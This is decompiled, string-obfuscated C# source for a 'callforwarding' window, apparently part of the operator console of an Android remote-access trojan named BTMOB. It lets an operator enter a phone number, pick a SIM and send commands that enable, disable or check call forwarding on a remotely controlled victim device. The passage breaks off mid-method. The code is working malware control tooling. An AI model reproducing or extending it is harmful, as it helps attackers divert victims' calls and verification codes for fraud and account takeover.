using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

namespace BTMOB;

[DesignerGenerated]
public class callforwarding : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("mytitle")]
	private Label _mytitle;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("myico")]
	private PictureBox _myico;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("disablebtn")]
	private DrakeUIButtonIcon _disablebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("enblebtn")]
	private DrakeUIButtonIcon _enblebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbtn")]
	private DrakeUIButtonIcon _checkbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("phonetext")]
	private DrakeUITextBox _phonetext;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("closbtn")]
	private DrakeUIButtonIcon _closbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	public BTClient Btcli;

	private bool keepmeto;

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public virtual Label mytitle
	{
		[CompilerGenerated]
		get
		{
			return _mytitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			Label label = _mytitle;
			if (label != null)
			{
				label.MouseDown -= value2;
			}
			_mytitle = value;
			label = _mytitle;
			if (label != null)
			{
				label.MouseDown += value2;
			}
		}
	}

	public virtual PictureBox myico
	{
		[CompilerGenerated]
		get
		{
			return _myico;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = mytitle_MouseDown;
			PictureBox pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown -= value2;
			}
			_myico = value;
			pictureBox = _myico;
			if (pictureBox != null)
			{
				pictureBox.MouseDown += value2;
			}
		}
	}

	[field: AccessedThroughProperty("spl2")]
	internal virtual DrakeWidth_W spl2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TableLayoutPanel1")]
	internal virtual TableLayoutPanel TableLayoutPanel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon disablebtn
	{
		[CompilerGenerated]
		get
		{
			return _disablebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon2_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_disablebtn = value;
			drakeUIButtonIcon = _disablebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon enblebtn
	{
		[CompilerGenerated]
		get
		{
			return _enblebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _enblebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_enblebtn = value;
			drakeUIButtonIcon = _enblebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon checkbtn
	{
		[CompilerGenerated]
		get
		{
			return _checkbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = pausebtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _checkbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_checkbtn = value;
			drakeUIButtonIcon = _checkbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("combosims")]
	internal virtual DrakeUIComboBox combosims
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox phonetext
	{
		[CompilerGenerated]
		get
		{
			return _phonetext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = phonetext_TextChanged;
			DrakeUITextBox drakeUITextBox = _phonetext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_phonetext = value;
			drakeUITextBox = _phonetext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon closbtn
	{
		[CompilerGenerated]
		get
		{
			return _closbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = closbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_closbtn = value;
			drakeUIButtonIcon = _closbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon pinbtn
	{
		[CompilerGenerated]
		get
		{
			return _pinbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = pinbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pinbtn = value;
			drakeUIButtonIcon = _pinbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public callforwarding()
	{
		base.Load += callforwarding_Load;
		keepmeto = true;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.callforwarding));
		this.Panel1 = new System.Windows.Forms.Panel();
		this.mytitle = new System.Windows.Forms.Label();
		this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.myico = new System.Windows.Forms.PictureBox();
		this.spl2 = new DrakeUI.Framework.DrakeWidth_W();
		this.closbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.TableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
		this.enblebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.disablebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.checkbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.combosims = new DrakeUI.Framework.DrakeUIComboBox();
		this.phonetext = new DrakeUI.Framework.DrakeUITextBox();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.TableLayoutPanel1.SuspendLayout();
		this.Panel3.SuspendLayout();
		base.SuspendLayout();
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel1.Controls.Add(this.mytitle);
		this.Panel1.Controls.Add(this.pinbtn);
		this.Panel1.Controls.Add(this.myico);
		this.Panel1.Controls.Add(this.spl2);
		this.Panel1.Controls.Add(this.closbtn);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel1.ForeColor = System.Drawing.Color.White;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = EXGuarder._6C47074F;
		this.Panel1.Padding = new System.Windows.Forms.Padding(10);
		this.Panel1.Size = new System.Drawing.Size(630, 53);
		this.Panel1.TabIndex = 2;
		this.mytitle.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.mytitle.Dock = System.Windows.Forms.DockStyle.Fill;
		this.mytitle.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 8f);
		this.mytitle.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.mytitle.Location = new System.Drawing.Point(64, 10);
		this.mytitle.Name = EXGuarder._6B70700A;
		this.mytitle.Size = new System.Drawing.Size(472, 33);
		this.mytitle.TabIndex = 40;
		this.mytitle.Text = EXGuarder._52173538;
		this.mytitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.pinbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pinbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.pinbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pinbtn.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 10f);
		this.pinbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pinbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pinbtn.Location = new System.Drawing.Point(536, 10);
		this.pinbtn.Name = EXGuarder._733F6440;
		this.pinbtn.Radius = 15;
		this.pinbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.pinbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pinbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pinbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pinbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.pinbtn.Size = new System.Drawing.Size(37, 33);
		this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pinbtn.Symbol = 57474;
		this.pinbtn.SymbolSize = 20;
		this.pinbtn.TabIndex = 44;
		this.myico.Dock = System.Windows.Forms.DockStyle.Left;
		this.myico.Location = new System.Drawing.Point(10, 10);
		this.myico.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.myico.Name = EXGuarder._521C3D47;
		this.myico.Size = new System.Drawing.Size(54, 33);
		this.myico.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.myico.TabIndex = 39;
		this.myico.TabStop = false;
		this.spl2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.spl2.Dock = System.Windows.Forms.DockStyle.Right;
		this.spl2.Location = new System.Drawing.Point(573, 10);
		this.spl2.Name = EXGuarder._3071673D;
		this.spl2.Size = new System.Drawing.Size(10, 33);
		this.spl2.TabIndex = 37;
		this.closbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.closbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.closbtn.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillHoverColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillPressColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.FillSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.closbtn.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 10f);
		this.closbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.closbtn.Location = new System.Drawing.Point(583, 10);
		this.closbtn.Name = EXGuarder._66367623;
		this.closbtn.Radius = 15;
		this.closbtn.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
		this.closbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.closbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.closbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.closbtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
		this.closbtn.Size = new System.Drawing.Size(37, 33);
		this.closbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.closbtn.Symbol = 61527;
		this.closbtn.SymbolSize = 20;
		this.closbtn.TabIndex = 43;
		this.TableLayoutPanel1.ColumnCount = 3;
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.TableLayoutPanel1.Controls.Add(this.enblebtn, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.disablebtn, 0, 0);
		this.TableLayoutPanel1.Controls.Add(this.checkbtn, 0, 0);
		this.TableLayoutPanel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.TableLayoutPanel1.Location = new System.Drawing.Point(0, 98);
		this.TableLayoutPanel1.Name = EXGuarder._5C694A62;
		this.TableLayoutPanel1.Padding = new System.Windows.Forms.Padding(8);
		this.TableLayoutPanel1.RowCount = 1;
		this.TableLayoutPanel1.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.TableLayoutPanel1.Size = new System.Drawing.Size(630, 58);
		this.TableLayoutPanel1.TabIndex = 3;
		this.enblebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.enblebtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.enblebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enblebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.enblebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enblebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enblebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enblebtn.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 9f);
		this.enblebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.enblebtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.enblebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enblebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enblebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.enblebtn.Location = new System.Drawing.Point(421, 13);
		this.enblebtn.Margin = new System.Windows.Forms.Padding(5);
		this.enblebtn.Name = EXGuarder._0C547459;
		this.enblebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.enblebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.enblebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enblebtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.enblebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.enblebtn.Size = new System.Drawing.Size(196, 32);
		this.enblebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.enblebtn.TabIndex = 24;
		this.enblebtn.Text = EXGuarder._56210748;
		this.disablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.disablebtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.disablebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.disablebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 9f);
		this.disablebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.disablebtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.disablebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.disablebtn.Location = new System.Drawing.Point(217, 13);
		this.disablebtn.Margin = new System.Windows.Forms.Padding(5);
		this.disablebtn.Name = EXGuarder._59692F12;
		this.disablebtn.Padding = new System.Windows.Forms.Padding(5);
		this.disablebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.disablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.disablebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.disablebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.disablebtn.Size = new System.Drawing.Size(194, 32);
		this.disablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.disablebtn.Symbol = 62091;
		this.disablebtn.TabIndex = 25;
		this.disablebtn.Text = EXGuarder._4F6E5342;
		this.checkbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkbtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.checkbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.checkbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.checkbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.checkbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.checkbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.checkbtn.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 9f);
		this.checkbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.checkbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.checkbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.checkbtn.Location = new System.Drawing.Point(13, 13);
		this.checkbtn.Margin = new System.Windows.Forms.Padding(5);
		this.checkbtn.Name = EXGuarder._0E1F552E;
		this.checkbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.checkbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.checkbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.checkbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.checkbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.checkbtn.Size = new System.Drawing.Size(194, 32);
		this.checkbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkbtn.Symbol = 61473;
		this.checkbtn.TabIndex = 23;
		this.checkbtn.Text = EXGuarder._3E722E74;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.combosims);
		this.Panel3.Controls.Add(this.phonetext);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(0, 53);
		this.Panel3.Name = EXGuarder._1A5D5D69;
		this.Panel3.Padding = new System.Windows.Forms.Padding(10);
		this.Panel3.Size = new System.Drawing.Size(630, 45);
		this.Panel3.TabIndex = 42;
		this.combosims.Dock = System.Windows.Forms.DockStyle.Right;
		this.combosims.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosims.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combosims.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.combosims.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 9f);
		this.combosims.ForeColor = System.Drawing.Color.White;
		this.combosims.Items.AddRange(new object[1] { EXGuarder._65487579 });
		this.combosims.Location = new System.Drawing.Point(512, 10);
		this.combosims.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.combosims.MinimumSize = new System.Drawing.Size(63, 0);
		this.combosims.Name = EXGuarder._1E670242;
		this.combosims.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosims.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combosims.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosims.Size = new System.Drawing.Size(108, 25);
		this.combosims.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosims.TabIndex = 49;
		this.combosims.Text = EXGuarder._65487579;
		this.combosims.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combosims.Watermark = EXGuarder._182B7820;
		this.phonetext.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.phonetext.Dock = System.Windows.Forms.DockStyle.Left;
		this.phonetext.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.phonetext.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.phonetext.Font = new System.Drawing.Font(EXGuarder._6E6A6667, 9f);
		this.phonetext.ForeColor = System.Drawing.Color.White;
		this.phonetext.Location = new System.Drawing.Point(10, 10);
		this.phonetext.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.phonetext.Maximum = 2147483647.0;
		this.phonetext.Minimum = -2147483648.0;
		this.phonetext.Name = EXGuarder._4D626D1F;
		this.phonetext.Padding = new System.Windows.Forms.Padding(5);
		this.phonetext.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.phonetext.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.phonetext.Size = new System.Drawing.Size(494, 25);
		this.phonetext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.phonetext.TabIndex = 18;
		this.phonetext.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.phonetext.Watermark = EXGuarder._1B723B69;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(630, 156);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.TableLayoutPanel1);
		base.Controls.Add(this.Panel1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._342D2C13);
		base.Name = EXGuarder._2D242954;
		base.ShowIcon = false;
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = EXGuarder._2D242954;
		this.Panel1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.TableLayoutPanel1.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._470C5D6D, EXGuarder._5A0C6431);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._22163D0F, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._6E2B1F3A;
			enblebtn.Text = EXGuarder._47270354;
			disablebtn.Text = EXGuarder._400D1C14;
			phonetext.Watermark = EXGuarder._5D106A08;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._750A7078, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._47536C34;
			enblebtn.Text = EXGuarder._67632C1A;
			disablebtn.Text = EXGuarder._484C6735;
			phonetext.Watermark = EXGuarder._3D01356C;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._54396908, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._51523C43;
			enblebtn.Text = EXGuarder._322E5114;
			disablebtn.Text = EXGuarder._68015366;
			phonetext.Watermark = EXGuarder._643B463B;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._0A494732, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._62080E04;
			enblebtn.Text = EXGuarder._37033F6A;
			disablebtn.Text = EXGuarder._41570444;
			phonetext.Watermark = EXGuarder._00540C5E;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._04373E68, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._3A14162A;
			enblebtn.Text = EXGuarder._58555A58;
			disablebtn.Text = EXGuarder._4A4F5558;
			phonetext.Watermark = EXGuarder._6B480850;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._713B1138, TextCompare: false))
		{
			checkbtn.Text = EXGuarder._3A14162A;
			enblebtn.Text = EXGuarder._3A2B353E;
			disablebtn.Text = EXGuarder._6C6B2504;
			phonetext.Watermark = EXGuarder._053A7751;
		}
	}

	private void callforwarding_Load(object sender, EventArgs e)
	{
		translateme();
		myico.Image = Btcli.wallpaper;
		mytitle.Text = Btcli.name;
	}

	private void mytitle_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (e.Button == MouseButtons.Left)
			{
				Nativz.ReleaseCapture();
				Nativz.SendMessage(base.Handle, 161, 2, 0);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void closbtn_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void pinbtn_Click(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.DeepSkyBlue;
			pinbtn.RectColor = Color.DeepSkyBlue;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.White;
			pinbtn.RectColor = Color.Gray;
			Nativz.SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}

	private void pausebtn_Click(object sender, EventArgs e)
	{
		string value = combosims.SelectedIndex.ToString();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._626E272E, EXGuarder._296B4073);
		dictionary.Add(EXGuarder._700F3B40, EXGuarder._72642074);
		dictionary.Add(EXGuarder._37170B17, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		string text = phonetext.Text;
		string value = combosims.SelectedIndex.ToString();
		if (codes.StrisEmpty(text))
		{
			BTAlerter.infos(BTConst.slctnumbstr);
			return;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0A0D2C06, EXGuarder._66761024);
		dictionary.Add(EXGuarder._525C495C, EXGuarder._6A08742A);
		dictionary.Add(EXGuarder._2313665A, text);
		dictionary.Add(EXGuarder._31707761, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void phonetext_TextChanged(object sender, EventArgs e)
	{
		try
		{
			phonetext.Text = Regex.Replace(phonetext.Text, EXGuarder._18530C5F, EXGuarder._45745B0E);
			phonetext.SelectionStart = phonetext.Text.Length;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Debuger.Log_e(EXGuarder._09160C42, ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		string value = combosims.SelectedIndex.ToString();
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0A490D18, EXGuarder._2E6F7639);
		dictionary.Add(EXGuarder._3D452E04, EXGuarder._481D0002);
		dictionary.Add(EXGuarder._58593726, value);
